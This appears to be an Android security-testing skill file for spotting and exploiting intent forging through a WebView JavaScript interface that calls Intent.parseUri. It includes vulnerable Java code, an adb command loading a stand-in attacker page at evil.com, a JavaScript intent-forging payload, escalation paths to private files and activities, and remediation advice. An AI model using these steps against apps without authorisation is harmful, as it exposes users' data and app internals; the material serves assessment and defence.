---
name: webview-js-interface-intent-forging
description: Use when an Android WebView exposes a @JavascriptInterface method that builds and launches an Intent from user-controlled input (Intent.parseUri), enabling an attacker who controls the loaded page to forge arbitrary intents (intent smuggling / deep link injection). Triggers - "Intent.parseUri", "addJavascriptInterface intent", "intent smuggling", "accessDeeplink", "JS bridge intent forging", "WebView intent launch"
platform: [android]
stack: [native]
category: webview
tier: B
related: []
---

# Skill: WebView JS Interface + Intent Forging (Android)

## Concept
A `WebView` with `addJavascriptInterface(obj, "name")` exposes Java methods to the
JavaScript of the loaded page. If the page is attacker-controlled (or via
MITM/SSL-bypass), the JS can call arbitrary Java methods. If one of those
methods builds and launches an `Intent` from user input, the attacker can
forge arbitrary intents (intent smuggling / deeplink injection).

## Identification (static)
```java
webView.addJavascriptInterface(new WebAppInterface(this), "netsight");
// webSettings.setJavaScriptEnabled(true);

@JavascriptInterface
public void accessDeeplink(String url) {
    Uri uri = Uri.parse(url);
    Intent intent = Intent.parseUri(uri.toString(), 1);
    startActivity(intent);  // <-- intent forging
}
```

## Necessary conditions
1. Exported WebView (`android:exported="true"`) or a controllable URL via intent extra
2. `setJavaScriptEnabled(true)`
3. `addJavascriptInterface` with a method that launches intents
4. The loaded URL is attacker-controlled (via `intent.getStringExtra("url")`)

## Exploitation
1. Launch the WebView with the attacker URL:
   ```
   am start -n com.example.app/.WebviewActivity --es url "https://evil.com/poc.html"
   ```
2. The JS page executes:
   ```javascript
   netsight.accessDeeplink("intent:#Intent;action=android.intent.action.VIEW;type=text/plain;end");
   ```
3. The forged intent can launch non-exported activities, open content URIs, etc.

## Escalation
- If the app has a `ContentProvider` with path traversal, the forged intent can
  open `content://` URIs to read files
- If the app has non-exported privileged activities, they can be launched
  directly via intent smuggling
- `Intent.parseUri(url, 1)` with the `URI_ANDROID_APP_SCHEME` flag (1) can parse
  complete intents including extras, components, etc.

## Remediation
- Do not use `addJavascriptInterface` with methods that launch intents
- If needed, validate the URL scheme (https:// only, no intent://)
- Do not export WebViews unnecessarily
- Use `WebViewClient.shouldOverrideUrlLoading` to validate URLs
